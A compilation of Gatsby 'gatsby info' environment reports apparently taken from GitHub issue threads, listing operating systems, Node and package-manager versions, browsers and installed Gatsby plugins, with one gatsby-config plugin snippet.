``` system: os: linux 4.18 ubuntu 18.04.2 lts (bionic beaver) cpu: (4) x64 amd athlon(tm) x4 750k quad core processor shell: 2.7.1 - /usr/bin/fish binaries: node: 12.1.0 - /usr/bin/node yarn: 1.15.2 - /usr/bin/yarn npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: chrome: 74.0.3729.131 firefox: 67.0.4 npmpackages: gatsby: ^2.13.6 => 2.13.6 gatsby-theme-blog: ^1.0.0 => 1.0.0
system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-3820 cpu @ 3.60ghz binaries: yarn: 1.16.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 44.18362.1.0 npmpackages: gatsby: ^2.13.4 => 2.13.4
``` os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.0 - /usr/local/bin/node yarn: 1.16.0 - ~/.yarn/bin/yarn npm: 6.7.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0.4 safari: 12.1.1 npmglobalpackages: gatsby-cli: 2.5.4
gatsby info --clipboard system: os: linux 5.0 pop!_os 19.04 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.5.1 - /bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.16.0 - /usr/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0.4 npmpackages: gatsby: ^2.13.3 => 2.13.3 gatsby-theme-blog: ^1.0.0 => 1.0.0
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /opt/local/bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.16.0 - /opt/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 safari: 12.1.1 npmglobalpackages: gatsby-cli: 2.7.7
``` system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i7-8700b cpu @ 3.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.1.0 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 safari: 12.1.1 npmpackages: gatsby: ^2.13.3 => 2.13.3 gatsby-plugin-typescript: 2.0.11 => 2.0.11
system: os: macos 10.14.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 11.12.0 - ~/.nvm/versions/node/v11.12.0/bin/node yarn: 1.15.2 - ~/.nvm/versions/node/v11.12.0/bin/yarn npm: 6.7.0 - ~/.nvm/versions/node/v11.12.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0 safari: 12.1 npmpackages: gatsby: ^2.10.0 => 2.13.3 gatsby-image: ^2.0.20 => 2.2.4 gatsby-plugin-create-client-paths: ^2.0.2 => 2.1.1 gatsby-plugin-manifest: ^2.0.9 => 2.2.1 gatsby-plugin-offline: ^2.0.16 => 2.2.0 gatsby-plugin-playground: ^1.0.6 => 1.0.6 gatsby-plugin-react-helmet: ^3.0.2 => 3.1.0 gatsby-plugin-sharp: ^2.0.14 => 2.2.2 gatsby-plugin-styled-components: ^3.1.0 => 3.1.0 gatsby-source-filesystem: ^2.0.8 => 2.1.2 gatsby-source-graphql: ^2.1.0 => 2.1.0 gatsby-transformer-sharp: ^2.1.8 => 2.2.1 npmglobalpackages: gatsby: 2.7.3
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 12.6.0 - ~/.nvm/versions/node/v12.6.0/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.6.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0.4 safari: 12.1.1 npmpackages: gatsby: ^2.13.2 => 2.13.2 gatsby-cli: ^2.7.7 => 2.7.7 gatsby-plugin-create-client-paths: ^2.1.1 => 2.1.1 gatsby-plugin-postcss: ^2.1.0 => 2.1.0 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0
(if relevant) ``` system: os: macos high sierra 10.13.2 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.14.2 - ~/.nvm/versions/node/v10.14.2/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.14.2/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 safari: 11.0.2 npmpackages: gatsby: 2.6.0 => 2.6.0 gatsby-image: ^2.0.15 => 2.0.25 gatsby-plugin-create-client-paths: ^2.0.2 => 2.0.3 gatsby-plugin-google-gtag: ^1.0.8 => 1.0.8 gatsby-plugin-manifest: ^2.0.5 => 2.0.12 gatsby-plugin-offline: ^2.0.11 => 2.0.20 gatsby-plugin-page-transitions: ^1.0.7 => 1.0.7 gatsby-plugin-react-css-modules: ^2.0.7 => 2.0.7 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.4 gatsby-plugin-sass: ^2.0.10 => 2.0.10 gatsby-plugin-sharp: ^2.0.18 => 2.0.18 gatsby-plugin-sitemap: ^2.0.12 => 2.0.12 gatsby-plugin-transition-link: ^1.12.2 => 1.12.2 gatsby-plugin-twitter: ^2.0.8 => 2.0.8 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-filesystem: ^2.0.4 => 2.0.12 gatsby-transformer-sharp: ^2.1.12 => 2.1.12 ``` ### file contents (if changed) can include these if relevant.
``` system: os: macos 10.14.5 cpu: x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.0.0 - /usr/local/bin/fish binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.16.0 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.npm-packages/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0 safari: 12.1.1 npmpackages: gatsby: 2.11.7 => 2.11.7 gatsby-plugin-canonical-urls: 2.1.0 => 2.1.0 gatsby-plugin-catch-links: 2.1.0 => 2.1.0 gatsby-plugin-feed: 2.3.1 => 2.3.1 gatsby-plugin-google-tagmanager: 2.1.0 => 2.1.0 gatsby-plugin-manifest: 2.2.0 => 2.2.0 gatsby-plugin-netlify: 2.1.0 => 2.1.0 gatsby-plugin-netlify-cms: 4.1.1 => 4.1.1 gatsby-plugin-node-fields: 2.0.1 => 2.0.1 gatsby-plugin-react-helmet: 3.1.0 => 3.1.0 gatsby-plugin-sass: 2.1.0 => 2.1.0 gatsby-plugin-sitemap: 2.2.1 => 2.2.1 gatsby-remark-autolink-headers: 2.1.0 => 2.1.0 gatsby-remark-copy-linked-files: 2.1.0 => 2.1.0 gatsby-remark-custom-blocks: 2.1.0 => 2.1.0 gatsby-remark-embed-video: 1.7.1 => 1.7.1 gatsby-remark-prismjs: 3.3.0 => 3.3.0 gatsby-remark-relative-links: 0.0.3 => 0.0.3 gatsby-remark-responsive-iframe: 2.2.1 => 2.2.1 gatsby-source-filesystem: 2.1.1 => 2.1.1 gatsby-transformer-remark: 2.5.0 => 2.5.0 gatsby-transformer-yaml: 2.2.0 => 2.2.0 npmglobalpackages: gatsby-cli: 2.7.7
codesandbox
``` system: os: macos 10.14.4 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.11.0 - ~/.nvm/versions/node/v10.11.0/bin/node yarn: 1.16.0 - ~/.yarn/bin/yarn npm: 6.5.0 - ~/.nvm/versions/node/v10.11.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0 safari: 12.1 npmpackages: gatsby: ^2.5.0 => 2.9.4 gatsby-mdx: ^0.6.3 => 0.6.3 gatsby-plugin-google-tagmanager: ^2.0.15 => 2.0.15 gatsby-plugin-layout: ^1.1.0 => 1.1.0 gatsby-plugin-postcss: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.37 => 2.0.37 gatsby-remark-copy-linked-files: ^2.1.0 => 2.1.0 gatsby-remark-images: ^3.0.11 => 3.0.11 gatsby-remark-relative-images: ^0.2.2 => 0.2.2 gatsby-source-filesystem: ^2.0.28 => 2.0.37 npmglobalpackages: gatsby-cli: 2.6.13
``` ### gatsby config ``` plugins: [ { resolve: \'gatsby-source-filesystem\', options: { name: "src", path: `${__dirname}/src/content/`, }, }, \'gatsby-plugin-sharp\', { resolve: \'gatsby-mdx\', options: { gatsbyremarkplugins: [ { resolve: `gatsby-remark-relative-images`, }, { resolve: "gatsby-remark-images", options: { maxwidth: 768 }, }, ], }, }, { resolve: \'gatsby-plugin-postcss\', options: { postcssplugins: [ require(\'postcss-preset-env\')({ stage: 0 }), require("postcss-nested")(), ], }, }, { resolve: \'gatsby-plugin-google-tagmanager\', options: { id: "xxx-xxxxxxxx", // include gtm in development
// defaults to false meaning gtm will only be loaded in production
includeindevelopment: true }, }, { resolve: 'gatsby-plugin-layout', options: { component: require.resolve('./src/components/layout.js') } } ],
``` system: os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 12.4.0 - /usr/local/bin/node yarn: 1.17.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 safari: 12.1.1 npmpackages: gatsby: ^2.10.5 => 2.10.5 gatsby-image: ^2.2.3 => 2.2.3 gatsby-plugin-create-client-paths: ^2.1.1 => 2.1.1 gatsby-plugin-manifest: ^2.2.0 => 2.2.0 gatsby-plugin-offline: ^2.2.0 => 2.2.0 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-sharp: ^2.2.1 => 2.2.1 gatsby-plugin-styled-components: ^3.1.0 => 3.1.0 gatsby-source-filesystem: ^2.1.1 => 2.1.1 gatsby-transformer-sharp: ^2.2.0 => 2.2.0 ```
system: os: linux 5.0 ubuntu 19.04 (disco dingo) cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.0.3 - /bin/bash binaries: node: 10.15.2 - /usr/bin/node yarn: 1.16.0 - /usr/bin/yarn npm: 5.8.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 74.0.3729.169 firefox: 67.0.4 npmpackages: gatsby: ^2.10.4 => 2.10.5 gatsby-image: ^2.1.0 => 2.2.3 gatsby-plugin-create-client-paths: ^2.0.5 => 2.1.1 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-manifest: ^2.1.1 => 2.2.0 gatsby-plugin-offline: ^2.1.1 => 2.2.0 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.0 gatsby-plugin-tslint: 0.0.2 => 0.0.2 gatsby-plugin-typescript: ^2.0.14 => 2.1.0 gatsby-source-filesystem: ^2.0.37 => 2.1.1 gatsby-transformer-sharp: ^2.1.19 => 2.2.0
system: os: macos high sierra 10.13.2 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.1 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm browsers: chrome: 75.0.3770.100 firefox: 66.0.4 safari: 11.0.2 npmpackages: gatsby: ^2.6.0 => 2.6.0 gatsby-image: ^2.1.0 => 2.1.0 gatsby-link: ^2.1.1 => 2.1.1 gatsby-plugin-catch-links: ^2.0.14 => 2.0.14 gatsby-plugin-eslint: ^2.0.5 => 2.0.5 gatsby-plugin-feed: ^2.2.0 => 2.2.0 gatsby-plugin-google-analytics: ^2.0.20 => 2.0.20 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-netlify: ^2.0.17 => 2.0.17 gatsby-plugin-nprogress: ^2.0.10 => 2.0.10 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-page-transitions: ^1.0.8 => 1.0.8 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^2.1.3 => 2.1.3 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-plugin-twitter: ^2.0.13 => 2.0.13 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.0.37 => 2.0.37 gatsby-source-wordpress: ^3.0.62 => 3.0.62 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages: gatsby-cli: 2.4.7
``` system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 75.0.3770.80 safari: 12.1.1 npmpackages: gatsby: ^2.9.2 => 2.10.0 gatsby-image: ^2.2.1 => 2.2.1 gatsby-plugin-feed: ^2.3.0 => 2.3.0 gatsby-plugin-google-analytics: ^2.1.0 => 2.1.0 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.0 => 2.2.0 gatsby-plugin-netlify: ^2.1.0 => 2.1.0 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ^1.4.0 => 1.4.0 gatsby-plugin-sharp: ^2.2.1 => 2.2.1 gatsby-plugin-sitemap: ^2.2.0 => 2.2.0 gatsby-plugin-styled-components: ^3.1.0 => 3.1.0 gatsby-plugin-typescript: ^2.1.0 => 2.1.0 gatsby-plugin-typography: ^2.3.0 => 2.3.0 gatsby-remark-copy-linked-files: ^2.1.0 => 2.1.0 gatsby-remark-embed-gist: ^1.1.7 => 1.1.7 gatsby-remark-embed-spotify: ^2.0.2 => 2.0.2 gatsby-remark-embed-video: ^1.7.1 => 1.7.1 gatsby-remark-images: ^3.0.14 => 3.1.0 gatsby-remark-prismjs: ^3.3.0 => 3.3.0 gatsby-remark-responsive-iframe: ^2.2.0 => 2.2.0 gatsby-remark-smartypants: ^2.1.0 => 2.1.0 gatsby-source-filesystem: ^2.0.39 => 2.1.0 gatsby-transformer-json: ^2.2.0 => 2.2.0 gatsby-transformer-remark: ^2.3.12 => 2.5.0 gatsby-transformer-sharp: ^2.2.0 => 2.2.0 ```
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.1 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.npm-packages/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 75.0.3770.100 firefox: 66.0.5 safari: 12.1.1 npmpackages: gatsby: ^2.8.5 => 2.8.5 gatsby-cli: ^2.6.5 => 2.6.5 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.3 => 2.1.3 gatsby-source-drupal: ^3.1.10 => 3.1.10 gatsby-source-filesystem: ^2.0.38 => 2.0.38 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages: gatsby-cli: 2.4.8
```txt system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.6.2 - /usr/local/bin/zsh binaries: node: 10.13.0 - /var/folders/nv/f8tyc7b960nf4kptb5890t400000gn/t/yarn--1561069776540-0.10964542529805676/node yarn: 1.13.0 - /var/folders/nv/f8tyc7b960nf4kptb5890t400000gn/t/yarn--1561069776540-0.10964542529805676/yarn npm: 6.4.1 - ~/.asdf/installs/nodejs/10.13.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 64.0.2 safari: 12.1.1 npmpackages: gatsby: ^2.10.0 => 2.10.0 gatsby-image: ^2.2.0 => 2.2.0 gatsby-plugin-create-client-paths: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.2.0 => 2.2.0 gatsby-plugin-offline: ^2.2.0 => 2.2.0 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-sharp: ^2.2.0 => 2.2.0 gatsby-source-filesystem: ^2.1.0 => 2.1.0 gatsby-transformer-sharp: ^2.2.0 => 2.2.0 ```
``` system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.6.2 - /usr/local/bin/zsh binaries: node: 10.15.3 - /var/folders/p4/0ptjct956432wm2q1dd048g40000gn/t/yarn--1561063929532-0.7049991999729923/node yarn: 1.16.0 - /var/folders/p4/0ptjct956432wm2q1dd048g40000gn/t/yarn--1561063929532-0.7049991999729923/yarn npm: 6.4.1 - ~/.asdf/shims/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0.3
gatsby info --clipboard system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-2720qm cpu @ 2.20ghz binaries: yarn: 1.12.3 - c:\\program files\ odejs\\yarn.cmd npm: 5.5.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.14 - /c/python27/python browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^1.9.277 => 1.9.277 gatsby-link: ^1.6.46 => 1.6.46 gatsby-plugin-google-analytics: ^2.0.6 => 2.0.6 gatsby-plugin-layout: ^1.0.15 => 1.0.15 gatsby-plugin-material-ui: ^2.0.1 => 2.0.1 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 i see this issue every gatsby site -
``` system: os: linux 3.10 centos linux 7 (core) cpu: (48) x64 intel(r) xeon(r) cpu e5-2650 v4 @ 2.20ghz shell: 4.2.46 - /bin/bash binaries: node: 10.15.1 - ~/webapps/nodejs/bin/node npm: 6.4.1 - ~/webapps/nodejs/bin/npm languages: python: 2.7.5 - /usr/local/bin/python npmpackages: gatsby: ^2.9.11 => 2.9.11 gatsby-image: ^2.1.4 => 2.1.4 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.3 => 2.1.3 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.9 => 2.1.9 gatsby-source-filesystem: ^2.0.43 => 2.0.43 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages: gatsby: 2.10.0
``` system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.2 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 74.0.3729.169 firefox: 66.0.3 safari: 12.1.1 npmpackages: gatsby: ^2.3.16 => 2.3.31 gatsby-image: ^2.0.37 => 2.0.40 gatsby-plugin-emotion: ^4.0.6 => 4.0.6 gatsby-plugin-manifest: ^2.0.28 => 2.0.29 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.0.32 => 2.0.35 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-source-drupal-preview: ^0.2.0 => 0.2.0 gatsby-source-filesystem: ^2.0.29 => 2.0.32 gatsby-transformer-sharp: ^2.1.17 => 2.1.18 npmglobalpackages: gatsby-cli: 2.5.12 gatsby: 2.1.22
system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2400s cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 12.4.0 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.7.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.169 firefox: 60.0.2 safari: 12.1.1 npmpackages: gatsby: ^2.9.9 => 2.9.9 gatsby-plugin-typescript: ^2.0.15 => 2.0.15
system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.0.2 - /usr/local/bin/fish binaries: node: 10.15.3 - /var/folders/5n/8fcbq7cn2mb0m8nn2jpd3zyh0000gn/t/yarn--1560881617782-0.8801172608473162/node yarn: 1.16.0 - /var/folders/5n/8fcbq7cn2mb0m8nn2jpd3zyh0000gn/t/yarn--1560881617782-0.8801172608473162/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 safari: 12.1.1 npmpackages: gatsby: latest => 2.9.6 gatsby-plugin-material-ui: latest => 2.0.1 gatsby-plugin-react-helmet: latest => 3.0.12 i'll also add that `@material-ui/core` and `@material-ui/styles` are both at version `4.1.1`
any further dependencies can be seen in the `yarn.lock` file in the repo linked above.
<summary>environment info</summary> ``` os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 8.16.0 - ~/.nvm/versions/node/v8.16.0/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v8.16.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.169 safari: 12.1.1 npmpackages: gatsby: ^2.9.4 => 2.9.4 gatsby-image: ^2.1.4 => 2.1.4 gatsby-plugin-feed: ^2.2.3 => 2.2.3 gatsby-plugin-google-analytics: ^2.0.21 => 2.0.21 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.3 => 2.1.3 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.5 => 2.1.5 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-remark-copy-linked-files: ^2.0.13 => 2.0.13 gatsby-remark-images: ^3.0.16 => 3.0.16 gatsby-remark-prismjs: ^3.2.11 => 3.2.11 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-source-filesystem: ^2.0.39 => 2.0.39 gatsby-transformer-json: ^2.1.11 => 2.1.11 gatsby-transformer-remark: ^2.4.0 => 2.4.0 gatsby-transformer-sharp: ^2.1.21 => 2.1.21
``` </details>
``` system: os: windows 10 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz binaries: yarn: 1.17.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 - /c/users/justin/.windows-build-tools/python27/python browsers: edge: 44.18362.267.0 npmpackages: gatsby: 2.13.80 => 2.13.80 gatsby-image: ^2.2.13 => 2.2.13 gatsby-plugin-manifest: ^2.2.9 => 2.2.9 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.5 => 3.1.5 gatsby-plugin-sharp: ^2.2.17 => 2.2.17 gatsby-source-filesystem: ^2.1.16 => 2.1.16 gatsby-transformer-sharp: ^2.2.11 => 2.2.11 ```
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 2.6.0 - /usr/local/bin/fish binaries: node: 8.11.2 - ~/.config/fnm/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.5.0 - ~/.config/fnm/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 74.0.3729.169 firefox: 64.0.2 safari: 12.1.1 npmpackages: gatsby: ^2.1.34 => 2.9.4 gatsby-image: ^2.0.23 => 2.1.4 gatsby-plugin-netlify: ^2.0.6 => 2.0.17 gatsby-plugin-netlify-cms: ^4.0.0 => 4.0.2 gatsby-plugin-purgecss: ^4.0.0 => 4.0.0 gatsby-plugin-react-helmet: ^3.0.4 => 3.0.12 gatsby-plugin-sass: ^2.0.7 => 2.0.11 gatsby-plugin-sharp: ^2.0.15 => 2.1.5 gatsby-remark-copy-linked-files: ^2.0.7 => 2.0.13 gatsby-remark-images: ^3.0.1 => 3.0.16 gatsby-remark-relative-images: ^0.2.1 => 0.2.2 gatsby-source-filesystem: ^2.0.26 => 2.0.39 gatsby-transformer-remark: ^2.3.4 => 2.4.0 gatsby-transformer-sharp: ^2.1.9 => 2.1.21
system: os: linux 5.0 solus 4.0 cpu: (16) x64 amd ryzen 7 2700x eight-core processor shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - /tmp/yarn--1560333901283-0.3912604025613824/node yarn: 1.16.0 - /tmp/yarn--1560333901283-0.3912604025613824/yarn npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 67.0.1 npmpackages: gatsby: 2.9.0 => 2.9.0 gatsby-image: 2.1.3 => 2.1.3 gatsby-plugin-eslint: 2.0.5 => 2.0.5 gatsby-plugin-manifest: 2.1.1 => 2.1.1 gatsby-plugin-react-helmet: 3.0.12 => 3.0.12 gatsby-plugin-robots-txt: 1.4.0 => 1.4.0 gatsby-plugin-sharp: 2.1.3 => 2.1.3 gatsby-plugin-sitemap: 2.1.0 => 2.1.0 gatsby-plugin-styled-components: 3.0.7 => 3.0.7 gatsby-plugin-typescript: 2.0.15 => 2.0.15 gatsby-plugin-webpack-bundle-analyzer: 1.0.5 => 1.0.5 gatsby-source-filesystem: 2.0.39 => 2.0.39 gatsby-source-prismic: 2.3.0-alpha.3 => 2.3.0-alpha.3 gatsby-source-shopify: 2.0.37 => 2.0.37 gatsby-transformer-sharp: 2.1.21 => 2.1.21
``` system: os: macos 10.14.3 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.0 - ~/.nvm/versions/node/v11.10.0/bin/node npm: 6.9.0 - ~/.nvm/versions/node/v11.10.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 74.0.3729.169 firefox: 66.0.3 safari: 12.0.3 npmpackages: gatsby: ^2.1.35 => 2.1.35 gatsby-image: ^2.0.34 => 2.0.34 gatsby-plugin-favicon: ^3.1.5 => 3.1.5 gatsby-plugin-google-tagmanager: ^2.0.10 => 2.0.10 gatsby-plugin-intercom: ^0.1.4 => 0.1.4 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-prefetch-google-fonts: ^1.4.1 => 1.4.1 gatsby-plugin-react-helmet: ^3.0.9 => 3.0.9 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-remove-trailing-slashes: ^2.0.10 => 2.0.10 gatsby-plugin-sharp: ^2.0.29 => 2.0.29 gatsby-plugin-styled-components: ^3.0.7 => 3.0.7 gatsby-plugin-svg-sprite: ^2.0.1 => 2.0.1 gatsby-plugin-zopfli: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.0.27 => 2.0.27 gatsby-transformer-json: ^2.1.11 => 2.1.11 gatsby-transformer-remark: ^2.3.4 => 2.3.4 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby-cli: 2.6.5
``` system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.1 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 74.0.3729.169 firefox: 66.0.5 safari: 12.0.3 npmpackages: gatsby: ^2.8.6 => 2.8.6 gatsby-image: ^2.1.2 => 2.1.2 gatsby-plugin-compile-es6-packages: ^1.1.0 => 1.1.0 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-typescript: ^2.0.15 => 2.0.15 gatsby-theme-shopify-poulo: ^0.8.12 => 0.8.12 ```
